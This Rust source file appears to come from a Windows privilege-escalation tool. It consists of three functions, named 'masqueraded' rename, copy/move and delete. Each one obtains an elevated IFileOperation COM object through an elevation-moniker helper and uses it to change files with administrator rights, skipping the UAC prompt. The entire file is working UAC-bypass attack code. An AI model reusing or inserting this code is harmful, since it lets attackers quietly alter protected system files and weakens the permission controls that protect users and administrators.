use crate::global::*;
use crate::interface::*;
use crate::shared::*;
use anyhow::*;
use std::ptr::null_mut;
use winapi::{
    shared::{winerror::S_OK, wtypesbase::CLSCTX_LOCAL_SERVER},
    um::{
        combaseapi::{CoInitializeEx, CoUninitialize},
        objbase::COINIT_APARTMENTTHREADED,
        shobjidl_core::{IShellItem, SHCreateItemFromParsingName}
    },
};
mod bindings {
    ::windows::include_bindings!();
}
//use bindings::Windows::Win32::Shell::SHCreateItemFromParsingName;
//use bindings::Windows::Win32::SystemServices::PWSTR;

#[allow(non_snake_case)]
pub fn masqueraded_rename(OldName: impl Into<String>, NewName: impl Into<String>) -> Result<()> {
    unsafe {
        let OldName = OldName.into();
        let NewName = NewName.into();
        let mut p_IFileOperation: *mut IFileOperation::IFileOperation = null_mut();
        let mut p_IShellItem: *mut IShellItem = null_mut();

        loop {
            crate::shared::check(CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED));

            if crate::com_utils::alloc_elevated_object(
                T_CLSID_FileOperation,
                IID_IFileOperation,
                CLSCTX_LOCAL_SERVER,
                &mut p_IFileOperation as *mut _ as *mut _,
            )? != S_OK
            {
                break;
            }

            if (*p_IFileOperation).SetOperationFlags(file_operation_flags()) != S_OK {
                break;
            }

            if SHCreateItemFromParsingName(
                e(&OldName).as_mut_ptr(),
                null_mut(),
                IID_IShellItem as *const _ as _,
                &mut p_IShellItem as *mut _ as *mut _,
            ) != S_OK {
                break;
            }

            if (*p_IFileOperation).RenameItem(p_IShellItem, e(&NewName).as_ptr(), null_mut())
                != S_OK
            {
                break;
            }

            if (*p_IFileOperation).PerformOperations() != S_OK {
                break;
            }

            if !p_IShellItem.is_null() {
                (*p_IShellItem).Release();
                p_IShellItem = null_mut();
            }

            break;
        }

        if !p_IFileOperation.is_null() {
            (*p_IFileOperation).Release();
        }

        if !p_IShellItem.is_null() {
            (*p_IShellItem).Release();
        }

        CoUninitialize();

        Ok(())
    }
}

#[allow(non_snake_case)]
pub fn masqueraded_copy_or_move(
    SourceFileName: impl Into<String>,
    DestinationDir: impl Into<String>,
    is_move: bool,
) -> Result<()> {
    unsafe {
        let SourceFileName = SourceFileName.into();
        let DestinationDir = DestinationDir.into();
        let mut p_IFileOperation: *mut IFileOperation::IFileOperation = null_mut();
        let mut p_IShellItem_src: *mut IShellItem = null_mut();
        let mut p_IShellItem_dst: *mut IShellItem = null_mut();

        loop {
            crate::shared::check(CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED));

            if crate::com_utils::alloc_elevated_object(
                T_CLSID_FileOperation,
                IID_IFileOperation,
                CLSCTX_LOCAL_SERVER,
                &mut p_IFileOperation as *mut _ as *mut _,
            )? != S_OK
            {
                break;
            }

            if (*p_IFileOperation).SetOperationFlags(file_operation_flags()) != S_OK {
                break;
            }

            if SHCreateItemFromParsingName(
                e(&SourceFileName).as_mut_ptr(),
                null_mut(),
                IID_IShellItem as *const _ as _,
                &mut p_IShellItem_src as *mut _ as *mut _,
            ) != S_OK {
                break;
            }

            if SHCreateItemFromParsingName(
                e(&DestinationDir).as_mut_ptr(),
                null_mut(),
                IID_IShellItem as *const _ as _,
                &mut p_IShellItem_dst as *mut _ as *mut _,
            ) != S_OK {
                break;
            }

            let r = if is_move {
                (*p_IFileOperation).MoveItem(
                    p_IShellItem_src,
                    p_IShellItem_dst,
                    null_mut(),
                    null_mut(),
                )
            } else {
                (*p_IFileOperation).CopyItem(
                    p_IShellItem_src,
                    p_IShellItem_dst,
                    null_mut(),
                    null_mut(),
                )
            };

            if r != S_OK {
                break;
            }

            if (*p_IFileOperation).PerformOperations() != S_OK {
                break;
            }

            if !p_IShellItem_src.is_null() {
                (*p_IShellItem_src).Release();
                p_IShellItem_src = null_mut();
            }

            if !p_IShellItem_dst.is_null() {
                (*p_IShellItem_dst).Release();
                p_IShellItem_dst = null_mut();
            }

            break;
        }

        if !p_IFileOperation.is_null() {
            (*p_IFileOperation).Release();
        }

        if !p_IShellItem_src.is_null() {
            (*p_IShellItem_src).Release();
        }

        if !p_IShellItem_dst.is_null() {
            (*p_IShellItem_dst).Release();
        }

        CoUninitialize();

        Ok(())
    }
}

#[allow(non_snake_case)]
pub fn masqueraded_delete(Name: impl Into<String>) -> Result<()> {
    unsafe {
        let Name = Name.into();
        let mut p_IFileOperation: *mut IFileOperation::IFileOperation = null_mut();
        let mut p_IShellItem: *mut IShellItem = null_mut();

        loop {
            crate::shared::check(CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED));

            if crate::com_utils::alloc_elevated_object(
                T_CLSID_FileOperation,
                IID_IFileOperation,
                CLSCTX_LOCAL_SERVER,
                &mut p_IFileOperation as *mut _ as *mut _,
            )? != S_OK
            {
                break;
            }

            if (*p_IFileOperation).SetOperationFlags(file_operation_flags()) != S_OK {
                break;
            }

            if SHCreateItemFromParsingName(
                e(&Name).as_mut_ptr(),
                null_mut(),
                IID_IShellItem as *const _ as _,
                &mut p_IShellItem as *mut _ as *mut _,
            ) != S_OK {
                break;
            }

            if (*p_IFileOperation).DeleteItem(p_IShellItem, null_mut())
                != S_OK
            {
                break;
            }

            if (*p_IFileOperation).PerformOperations() != S_OK {
                break;
            }

            if !p_IShellItem.is_null() {
                (*p_IShellItem).Release();
                p_IShellItem = null_mut();
            }

            break;
        }

        if !p_IFileOperation.is_null() {
            (*p_IFileOperation).Release();
        }

        if !p_IShellItem.is_null() {
            (*p_IShellItem).Release();
        }

        CoUninitialize();

        Ok(())
    }
}
